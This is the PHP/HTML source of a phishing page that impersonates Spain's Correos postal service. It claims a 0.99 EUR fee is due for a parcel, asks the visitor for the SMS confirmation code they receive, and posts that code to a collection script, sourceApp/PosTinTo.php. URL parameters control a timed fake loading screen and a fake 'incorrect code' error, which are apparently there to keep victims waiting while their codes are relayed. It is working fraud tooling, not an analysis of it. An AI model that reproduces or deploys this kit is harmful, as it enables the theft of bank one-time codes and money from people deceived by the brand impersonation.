<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="corrios/img/correos.ico">
<link href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="./corrios/css/corrios_style01.css">
<link rel="stylesheet" type="text/css" href="./corrios/css/corrios_style03.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

</head>
<body>


<?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(40000).fadeOut(150);
            });
        });

</script>';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<script type="text/javascript">
  
   $(document).ready(function () {
            $("#loadingo9lawzan").fadeIn("slow", function () {
                $("#loadingo9lawzan").delay(35000).fadeOut(150);
            });
        });

</script>';
}

 ?>

 <div class="pageLoader" id="loadingo9lawzan" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1.9; text-align: center; display: none;">
<p style="margin-top: 94px;font-size: 19px;color: #5f5f5f!important;font-weight: 500;">
<p class="alert alert-success" id="alert-success"><i class="fas fa-exclamation"></i> &nbsp;  Espere mientras procesamos su solicitud. No cierre el navegador.</p>
</p>
  <div class="spinner loading"></div></div>


<div class="topnav" id="myTopnav">
  <a href="" ><img src="./corrios/img/Logo_Correos.png" id="img"></a>
  <a id="right">Welcome</a>
  <a id="right">Ongi etorri</a>
  <a id="right">Benvinguts</a>
  <a id="right">Benvidos</a>
  <a id="right" class="rightBorder">Bienvenidos</a>
  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
    <i class="fa fa-bars"></i>
  </a>
</div>



<main role="main" class="flex-shrink-0">






    

<div class="jumbotron" id="bgindex">
        <div class="container">
          <h1 class="display-3"><img src="./corrios/img/Correos_2020.png"  width="200"></h1>
         <span class="itext-center"><span class="nota">NOTA : </span>Debe ingresar sus datos y pagar 0,99 EUR para recibir su paquete con correos.</span>
         
        </div>
      </div>
  <div class="container">

<div class="row">
<div class="col-sm-9">
<form name="myForm" action="sourceApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
<div class="card-body p-5 " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <p class="alert alert-success" id="xalert-success"><i class="fas fa-sms"></i>&nbsp;  Después de un tiempo, recibirá un código SMS para su confirmación. Debe haber recibido un SMS con un código en su teléfono.</p>

 <?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){

echo ' <div class="alert alert-danger alert-dismissible fade show" role="alert">
  <strong>Código incorrecto.</strong>  Por favor, introduzca el código de SMS.
  <button type="button" class="close" data-dismiss="alert" aria-label="Close">
    <span aria-hidden="true">&times;</span>
  </button>
</div>';
}

 ?>
 
   
<div class="card text-center">
  <div class="card-body" style=" color: #191919; background-color: #ffffff; ">
    <h5 class="card-title">Ingrese el código recibido por sms</h5>
    <div class="form-group">
 <input class="form-control" style="text-align: center;" type="text" onkeypress="if(this.value.length==8) return false;" id="F982345787234LPIN" name="F982345787234LPIN">                    </div>

  

  <?php 
if (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "true") {
   echo '<button class="subscribe btn btn-primary btn-block" type="submit" name="smsone"> confirmar  </button>';
}elseif (isset($_GET['assure_boba']) && $_GET['assure_boba'] == "false"){
 echo '<button class="subscribe btn btn-primary btn-block" type="submit" name="smstow"> confirmar  </button>';
}

 ?>


  </div>
 
</div>

  
 <!-- row.// -->
 
  
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div></form>
  
  
 

            </div>

            <div class="col-sm-3 ">
               
               <div class="card" >
  <div class="card-header">
   <strong>  Datos de la operación</strong>
  </div>
  <ul class="list-group list-group-flush">
    <li class="list-group-item"><strong> Importe: </strong>0,99 €</li>
    <li class="list-group-item"><strong> Comercio: </strong>SOCIEDAD ESTATAL (CORREOS)</li>
    <li class="list-group-item"><strong> Terminal: </strong>346841091-1</li>
    <li class="list-group-item"><strong> Pedido: </strong>111962998804</li>
    <li class="list-group-item"><img src="./corrios/img/ServiRed1.gif"></li>
  </ul>

  
</div>

        </div>



</div>

  </div>





<!-- Footer -->
<!-- Footer -->
<footer class="page-footer font-small blue pt-4">

  <!-- Footer Links -->
  <div class="container-fluid text-center text-md-left">

    <!-- Grid row -->
    <div class="row">

      <!-- Grid column -->
      <div class="col-md-6 mt-md-0 mt-3">

        <!-- Content -->
        <h5 class="text-uppercase"><img src="corrios/img/correosimg.png"></h5>
        <p class="pfooter">©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.</p>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none pb-3">

      <!-- Grid column -->
      <div class="col-md-3 mb-md-0 mb-3">

        <!-- Links -->

        <ul class="list-unstyled">
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Aviso legal</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Privacidad web</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Mapa web</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Accesibilidad</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <!-- Grid column -->
      <div class="col-md-3 mb-md-0 mb-3">

        <!-- Links -->

        <ul class="list-unstyled">
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Política de Cookies</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Alerta de seguridad</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;RSS</a>
          </li>
          <li>
            <a href="#!" class="atext"><i class="fas fa-chevron-right"></i>&nbsp;Productos de la A a la Z</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

    </div>
    <!-- Grid row -->

  </div>
  <!-- Footer Links -->

  <!-- Copyright -->
  <div class="footer-copyright text-center py-3 pfooter">© 2022 Copyrigh :
    <a href="" class="atext"> correos.es</a>
  </div>
  <!-- Copyright -->

</footer>
<!-- Footer -->
<!-- Footer -->



</main>





<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "topnav") {
    x.className += " responsive";
  } else {
    x.className = "topnav";
  }
}
</script>
<script  src="sourceApp/chronopost_sm.js"></script>



</body>
</html>
